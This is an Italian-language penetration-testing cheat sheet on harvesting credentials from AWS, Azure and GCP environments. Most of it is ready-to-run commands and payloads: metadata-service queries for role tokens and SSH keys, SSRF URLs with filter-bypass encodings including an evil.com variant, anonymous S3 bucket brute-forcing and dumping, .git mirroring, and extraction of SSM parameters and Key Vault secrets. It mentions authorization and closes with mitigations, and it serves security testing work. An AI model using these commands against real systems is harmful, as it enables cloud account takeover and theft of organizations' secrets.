# Cloud Credential Harvesting

## Scopo

Questa guida copre tecniche di raccolta credenziali in ambienti cloud (AWS, Azure, GCP) durante penetration test, inclusi metadata service attacks e storage misconfigurations.

## Prerequisiti

- Conoscenza AWS, Azure, GCP
- CLI cloud (aws-cli, az, gcloud)
- Accesso autorizzato all'ambiente
- **Autorizzazione per testing**

## Installazione

```bash
# AWS CLI
sudo apt-get install awscli

# Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Google Cloud SDK
curl https://sdk.cloud.google.com | bash
```

---

## IMDS (Instance Metadata Service)

### AWS Metadata

```bash
# IMDSv1 (deprecato ma spesso attivo)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# User data (può contenere secrets)
curl http://169.254.169.254/latest/user-data
```

### Azure Metadata

```bash
# IMDS
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Access token
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### GCP Metadata

```bash
# Metadata
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/

# Service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# SSH keys
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
```

---

## SSRF per Credential Harvesting

### Via Applicazione Vulnerabile

```bash
# Parametro URL
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Bypass
http://169.254.169.254/
http://[::ffff:169.254.169.254]/
http://2852039166/  # Decimal IP
http://0xa9fea9fe/  # Hex IP
```

### Bypass Filters

```bash
# DNS rebinding
# Redirect chain
# URL encoding
http://169.254.169.254%00@evil.com/
http://169.254.169.254.evil.com/
```

---

## S3 Bucket Enumeration

### Discovery

```bash
# Brute force bucket names
aws s3 ls s3://target-backup --no-sign-request
aws s3 ls s3://target-dev --no-sign-request
aws s3 ls s3://target-prod --no-sign-request

# Tools
python3 bucket_finder.py -w wordlist.txt
```

### Credential Files

```bash
# File comuni con credenziali
.env
config.json
credentials
secrets.yaml
.aws/credentials
id_rsa
*.pem
*.key
```

### Download

```bash
# Se pubblico
aws s3 cp s3://bucket/credentials.json . --no-sign-request
aws s3 sync s3://bucket/ ./dump/ --no-sign-request
```

---

## Azure Storage

### Blob Enumeration

```bash
# URL format
https://STORAGE_ACCOUNT.blob.core.windows.net/CONTAINER/BLOB

# Listing pubblico
curl "https://storage.blob.core.windows.net/container?restype=container&comp=list"

# Tools
# MicroBurst, BlobHunter
```

### Connection Strings

```
# Format
DefaultEndpointsProtocol=https;AccountName=<name>;AccountKey=<key>;EndpointSuffix=core.windows.net

# Se trovata, accesso completo
```

---

## GCP Storage

### Bucket Access

```bash
# Listing pubblico
curl "https://storage.googleapis.com/BUCKET_NAME"
gsutil ls gs://BUCKET_NAME

# Download
gsutil cp gs://BUCKET_NAME/file .
```

### Service Account Key

```json
# Se trovata chiave JSON
{
  "type": "service_account",
  "project_id": "PROJECT",
  "private_key_id": "KEY_ID",
  "private_key": "-----BEGIN PRIVATE KEY-----...",
  "client_email": "sa@project.iam.gserviceaccount.com"
}

# Usa
gcloud auth activate-service-account --key-file=key.json
```

---

## Environment Variables

### Estrazione

```bash
# Via RCE
env
printenv

# Comuni
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
AZURE_CLIENT_SECRET
GOOGLE_APPLICATION_CREDENTIALS
```

### Docker/Container

```bash
# Inspect container
docker inspect CONTAINER_ID | grep -i key
docker inspect CONTAINER_ID | grep -i secret
docker inspect CONTAINER_ID | grep -i password
```

---

## Git Repositories

### Exposed .git

```bash
# Download
wget --mirror -I .git http://target.com/.git

# Extract
git checkout -- .

# History
git log --all
git show COMMIT_HASH
```

### Secrets in History

```bash
# truffleHog
truffleHog git https://github.com/org/repo

# GitLeaks
gitleaks detect --source .

# git-secrets
git secrets --scan
```

---

## AWS Specific

### STS AssumeRole

```bash
# Se hai credenziali, verifica ruoli assumibili
aws sts get-caller-identity
aws iam list-roles
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE --role-session-name test
```

### Lambda Environment

```bash
# Lambda function contengono spesso secrets
aws lambda get-function --function-name NAME
aws lambda list-functions --query 'Functions[].Environment'
```

### SSM Parameters

```bash
# Parameter Store può contenere secrets
aws ssm get-parameters-by-path --path "/" --recursive
aws ssm get-parameter --name "/prod/db/password" --with-decryption
```

---

## Azure Specific

### Managed Identity

```bash
# Da VM Azure
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Usa token per Key Vault
```

### Key Vault

```bash
# Lista secrets
az keyvault secret list --vault-name VAULT_NAME

# Get secret
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME
```

---

## Mitigazioni

### AWS

```
- IMDSv2 (richiede token)
- VPC Endpoints
- S3 Block Public Access
- Secrets Manager invece di env vars
```

### Azure

```
- Managed Identity
- Key Vault
- Private endpoints
- Azure Defender
```

### GCP

```
- Workload Identity
- Secret Manager
- VPC Service Controls
- Organization policies
```

---

## Best Practices

- **Scope**: Solo risorse autorizzate
- **Non-destructive**: Solo read, no modifiche
- **Documentation**: Log tutto
- **Responsible**: Segnala misconfigurations
- **Cleanup**: Elimina dati copiati dopo test

## Riferimenti

- [AWS IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [Azure IMDS](https://docs.microsoft.com/azure/virtual-machines/linux/instance-metadata-service)
- [GCP Metadata](https://cloud.google.com/compute/docs/metadata/overview)
- [HackTricks Cloud](https://cloud.hacktricks.xyz/)
